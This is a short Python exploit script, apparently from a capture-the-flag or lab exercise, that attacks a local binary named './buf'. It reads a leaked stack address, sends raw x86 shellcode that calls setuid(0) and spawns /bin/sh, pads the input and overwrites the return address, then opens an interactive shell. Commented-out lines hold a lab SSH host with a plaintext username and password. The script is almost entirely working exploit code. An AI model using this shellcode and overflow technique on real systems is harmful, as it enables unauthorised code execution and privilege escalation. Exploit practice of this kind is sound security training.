
from roppy import *

#sh = ssh(host="10.1.1.146",user="pwnsec",password="pwnsausage")
#sh.set_working_directory("/home/pwnsec/Desktop")

p = process('./buf')

addr = int(p.recvline().split(b': ')[1].strip(b'\n'), 16) 
sc = b"\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80";

payload = sc
payload += b'A'*(132-30)
payload += p32(addr)

p.sendline(payload)

p.interactive()
